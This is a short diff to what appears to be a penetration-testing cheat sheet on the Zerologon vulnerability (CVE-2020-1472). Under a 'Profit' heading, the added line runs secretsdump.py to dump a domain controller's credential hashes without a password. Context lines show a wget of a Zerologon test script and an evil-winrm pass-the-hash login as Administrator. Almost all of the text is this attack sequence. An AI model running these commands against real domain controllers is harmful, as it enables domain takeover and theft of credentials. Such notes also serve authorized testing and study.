@@ -36,5 +36,6 @@ wget https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_t
 ## Profit
 
 ```
+secretsdump.py -just-dc -no-pass <DC_NAME>\$@<RHOST>
 evil-winrm -u Administrator -H <LOCAL_ADMIN_HASH> -i <RHOST>
 ```
